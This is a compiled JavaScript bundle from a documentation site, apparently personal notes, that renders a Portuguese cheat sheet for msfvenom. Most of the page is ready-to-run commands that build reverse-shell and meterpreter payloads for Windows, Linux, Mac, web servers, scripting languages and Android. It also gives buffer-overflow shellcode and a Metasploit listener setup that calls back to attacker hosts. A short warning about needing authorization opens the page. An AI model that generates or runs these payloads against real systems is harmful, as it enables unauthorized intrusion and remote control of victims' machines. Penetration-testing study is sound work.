"use strict";(self.webpackChunkmy_docs=self.webpackChunkmy_docs||[]).push([[1693],{5197:(e,a,s)=>{s.r(a),s.d(a,{assets:()=>i,contentTitle:()=>d,default:()=>t,frontMatter:()=>l,metadata:()=>r,toc:()=>c});var n=s(4848),o=s(8453);const l={id:"msfvenom",title:"msfvenom"},d=void 0,r={id:"pentest/msfvenom",title:"msfvenom",description:"O msfvenom \xe9 uma poderosa ferramenta utilizada para criar exploits e gerar",source:"@site/docs/pentest/msfvenom.mdx",sourceDirName:"pentest",slug:"/pentest/msfvenom",permalink:"/my-docs/docs/pentest/msfvenom",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{id:"msfvenom",title:"msfvenom"},sidebar:"tutorialSidebar",previous:{title:"john",permalink:"/my-docs/docs/pentest/john"},next:{title:"netcat",permalink:"/my-docs/docs/pentest/netcat"}},i={},c=[{value:"Aviso Importante",id:"aviso-importante",level:2},{value:"Testando Payloads",id:"testando-payloads",level:2},{value:"Listando Payloads Dispon\xedveis",id:"listando-payloads-dispon\xedveis",level:2},{value:"Gerando Payloads para Diferentes Sistemas",id:"gerando-payloads-para-diferentes-sistemas",level:2},{value:"Payload para Windows",id:"payload-para-windows",level:3},{value:"Payload para Linux",id:"payload-para-linux",level:3},{value:"Payload para Mac",id:"payload-para-mac",level:3},{value:"Payloads para Servidores WEB",id:"payloads-para-servidores-web",level:2},{value:"Payload PHP",id:"payload-php",level:3},{value:"Payload ASP",id:"payload-asp",level:3},{value:"Payload JSP",id:"payload-jsp",level:3},{value:"Payload WAR",id:"payload-war",level:3},{value:"Payloads Adicionais",id:"payloads-adicionais",level:2},{value:"Payload Python",id:"payload-python",level:3},{value:"Payload Bash",id:"payload-bash",level:3},{value:"Payload Perl",id:"payload-perl",level:3},{value:"Shellcode",id:"shellcode",level:2},{value:"Linux Based Shellcode",id:"linux-based-shellcode",level:3},{value:"Windows Based Shellcode",id:"windows-based-shellcode",level:3},{value:"Mac Based Shellcode",id:"mac-based-shellcode",level:3},{value:"Recebendo a Conex\xe3o do Alvo",id:"recebendo-a-conex\xe3o-do-alvo",level:2},{value:"Criando um Exploit para Windows para Buffer Overflow (BoF)",id:"criando-um-exploit-para-windows-para-buffer-overflow-bof",level:2},{value:"Gerando Payload Bin\xe1rio para Sistema Linux",id:"gerando-payload-bin\xe1rio-para-sistema-linux",level:2},{value:"Gerando Payload APK para Android",id:"gerando-payload-apk-para-android",level:2}];function p(e){const a={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(a.p,{children:["O ",(0,n.jsx)(a.code,{children:"msfvenom"})," \xe9 uma poderosa ferramenta utilizada para criar exploits e gerar\npayloads para diferentes sistemas operacionais e arquiteturas. \xc9 uma parte\nessencial do Metasploit Framework, uma plataforma de testes de penetra\xe7\xe3o de\nc\xf3digo aberto."]}),"\n",(0,n.jsx)(a.h2,{id:"aviso-importante",children:"Aviso Importante"}),"\n",(0,n.jsxs)(a.p,{children:["Ao usar o ",(0,n.jsx)(a.code,{children:"msfvenom"})," para criar payloads maliciosos, \xe9 crucial garantir que voc\xea\ntenha autoriza\xe7\xe3o expl\xedcita para realizar tais testes em sistemas e redes. O uso\nindevido dessas t\xe9cnicas \xe9 ilegal e pode resultar em s\xe9rias consequ\xeancias\nlegais."]}),"\n",(0,n.jsx)(a.h2,{id:"testando-payloads",children:"Testando Payloads"}),"\n",(0,n.jsxs)(a.p,{children:["Antes de executar os payloads gerados, \xe9 altamente recomendado test\xe1-los em um\nambiente controlado. Uma maneira de fazer isso \xe9 enviando o arquivo para o site\n",(0,n.jsx)(a.a,{href:"https://www.virustotal.com",children:"VirusTotal"}),", por\xe9m, tenha cuidado, pois o envio\npara o VirusTotal pode atualizar a heur\xedstica de alguns antiv\xedrus, tornando os\npayloads mais detect\xe1veis."]}),"\n",(0,n.jsx)(a.h2,{id:"listando-payloads-dispon\xedveis",children:"Listando Payloads Dispon\xedveis"}),"\n",(0,n.jsx)(a.p,{children:"Para verificar todos os payloads dispon\xedveis, execute o seguinte comando:"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom --list payloads\n"})}),"\n",(0,n.jsx)(a.h2,{id:"gerando-payloads-para-diferentes-sistemas",children:"Gerando Payloads para Diferentes Sistemas"}),"\n",(0,n.jsx)(a.h3,{id:"payload-para-windows",children:"Payload para Windows"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=192.168.0.100 \\\n    LPORT=443 \\\n    -f exe > virus.exe\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-para-linux",children:"Payload para Linux"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f elf > shell.elf\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-para-mac",children:"Payload para Mac"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p osx/x86/shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f macho > shell.macho\n"})}),"\n",(0,n.jsx)(a.h2,{id:"payloads-para-servidores-web",children:"Payloads para Servidores WEB"}),"\n",(0,n.jsx)(a.h3,{id:"payload-php",children:"Payload PHP"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p php/meterpreter_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.php\n\ncat shell.php | pbcopy && \\\n    echo '<?php ' | tr -d '\\n' > shell.php && \\\n    pbpaste >> shell.php\n"})}),"\n",(0,n.jsxs)(a.admonition,{type:"info",children:[(0,n.jsxs)(a.p,{children:[(0,n.jsx)(a.code,{children:"pbcopy"})," e ",(0,n.jsx)(a.code,{children:"pbpaste"})," precisam ser instalados atrav\xe9s do seguinte comando:"]}),(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"sudo apt-get install xclip\n"})})]}),"\n",(0,n.jsx)(a.h3,{id:"payload-asp",children:"Payload ASP"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f asp > shell.asp\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-jsp",children:"Payload JSP"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p java/jsp_shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.jsp\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-war",children:"Payload WAR"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p java/jsp_shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f war > shell.war\n"})}),"\n",(0,n.jsx)(a.h2,{id:"payloads-adicionais",children:"Payloads Adicionais"}),"\n",(0,n.jsx)(a.h3,{id:"payload-python",children:"Payload Python"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p cmd/unix/reverse_python \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.py\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-bash",children:"Payload Bash"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p cmd/unix/reverse_bash \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.sh\n"})}),"\n",(0,n.jsx)(a.h3,{id:"payload-perl",children:"Payload Perl"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p cmd/unix/reverse_perl \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f raw > shell.pl\n"})}),"\n",(0,n.jsx)(a.h2,{id:"shellcode",children:"Shellcode"}),"\n",(0,n.jsxs)(a.p,{children:["Para todos os c\xf3digos de shell, consulte ",(0,n.jsx)(a.code,{children:"msfvenom --list format"})," para obter\ninforma\xe7\xf5es sobre par\xe2metros v\xe1lidos. O ",(0,n.jsx)(a.code,{children:"msfvenom"})," produzir\xe1 um c\xf3digo que pode\nser recortado e colado nessa linguagem para suas explora\xe7\xf5es."]}),"\n",(0,n.jsx)(a.h3,{id:"linux-based-shellcode",children:"Linux Based Shellcode"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n"})}),"\n",(0,n.jsx)(a.h3,{id:"windows-based-shellcode",children:"Windows Based Shellcode"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p windows/meterpreter/reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n"})}),"\n",(0,n.jsx)(a.h3,{id:"mac-based-shellcode",children:"Mac Based Shellcode"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p osx/x86/shell_reverse_tcp \\\n    LHOST=${IP} \\\n    LPORT=${PORTA} \\\n    -f ${FORMATO}\n"})}),"\n",(0,n.jsx)(a.h2,{id:"recebendo-a-conex\xe3o-do-alvo",children:"Recebendo a Conex\xe3o do Alvo"}),"\n",(0,n.jsx)(a.p,{children:"Para receber a conex\xe3o do alvo, ser\xe1 necess\xe1rio que o Metasploit esteja em\nexecu\xe7\xe3o. Para configurar o Metasploit para a conex\xe3o reversa, siga os seguintes\npassos:"}),"\n",(0,n.jsxs)(a.ol,{children:["\n",(0,n.jsxs)(a.li,{children:["\n",(0,n.jsx)(a.p,{children:"Execute o Metasploit:"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfconsole\n"})}),"\n"]}),"\n",(0,n.jsxs)(a.li,{children:["\n",(0,n.jsx)(a.p,{children:"No console do Metasploit, configure o exploit e as op\xe7\xf5es necess\xe1rias:"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-msf",children:"msf > use exploit/multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LPORT 443\nmsf exploit(handler) > set LHOST 192.168.0.100\nmsf exploit(handler) > exploit\n"})}),"\n"]}),"\n"]}),"\n",(0,n.jsx)(a.h2,{id:"criando-um-exploit-para-windows-para-buffer-overflow-bof",children:"Criando um Exploit para Windows para Buffer Overflow (BoF)"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:'msfvenom -p windows/shell_reverse_tcp \\\n    LHOST=192.168.0.100 \\\n    LPORT=443 \\\n    -b "\\x00\\x0a\\x0d\\x20" \\\n    EXITFUNC=thread \\\n    -f python\n'})}),"\n",(0,n.jsx)(a.p,{children:"Explica\xe7\xe3o dos par\xe2metros:"}),"\n",(0,n.jsxs)(a.ul,{children:["\n",(0,n.jsxs)(a.li,{children:[(0,n.jsx)(a.code,{children:"-p windows/shell_reverse_tcp"}),": Tipo do exploit."]}),"\n",(0,n.jsxs)(a.li,{children:[(0,n.jsx)(a.code,{children:"LHOST"}),": IP de conex\xe3o reversa."]}),"\n",(0,n.jsxs)(a.li,{children:[(0,n.jsx)(a.code,{children:"LPORT"}),": Porta de conex\xe3o reversa."]}),"\n",(0,n.jsxs)(a.li,{children:[(0,n.jsx)(a.code,{children:'-b "\\x00\\x0a\\x0d\\x20"'}),": Bad caracteres ou caracteres inv\xe1lidos."]}),"\n",(0,n.jsxs)(a.li,{children:[(0,n.jsx)(a.code,{children:"EXITFUNC=thread"}),": Evita que a aplica\xe7\xe3o morra depois do exploit ser fechado."]}),"\n"]}),"\n",(0,n.jsx)(a.h2,{id:"gerando-payload-bin\xe1rio-para-sistema-linux",children:"Gerando Payload Bin\xe1rio para Sistema Linux"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p linux/x86/meterpreter/reverse_tcp \\\n    lport=433 \\\n    lhost=192.168.0.111 \\\n    -f elf > malicioso\n"})}),"\n",(0,n.jsx)(a.p,{children:"Esse tipo de payload \xe9 usado quando voc\xea j\xe1 tem acesso \xe0 shell no dispositivo e\nnecessita usar o meterpreter para auxiliar na p\xf3s-explora\xe7\xe3o."}),"\n",(0,n.jsx)(a.h2,{id:"gerando-payload-apk-para-android",children:"Gerando Payload APK para Android"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-bash",children:"msfvenom -p android/meterpreter/reverse_tcp \\\n    lport=433 \\\n    lhost=192.168.0.111 \\\n    R > malicioso.apk\n"})}),"\n",(0,n.jsx)(a.admonition,{type:"info",children:(0,n.jsxs)(a.p,{children:["O par\xe2metro ",(0,n.jsx)(a.code,{children:"R"})," indica que o arquivo ser\xe1 salvo em modo RAW. Essa abordagem \xe9\nutilizada quando voc\xea j\xe1 tem uma shell no dispositivo Android e necessita usar o\nmeterpreter para auxiliar na p\xf3s-explora\xe7\xe3o."]})})]})}function t(e={}){const{wrapper:a}={...(0,o.R)(),...e.components};return a?(0,n.jsx)(a,{...e,children:(0,n.jsx)(p,{...e})}):p(e)}},8453:(e,a,s)=>{s.d(a,{R:()=>d,x:()=>r});var n=s(6540);const o={},l=n.createContext(o);function d(e){const a=n.useContext(l);return n.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function r(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:d(e.components),n.createElement(l.Provider,{value:a},e.children)}}}]);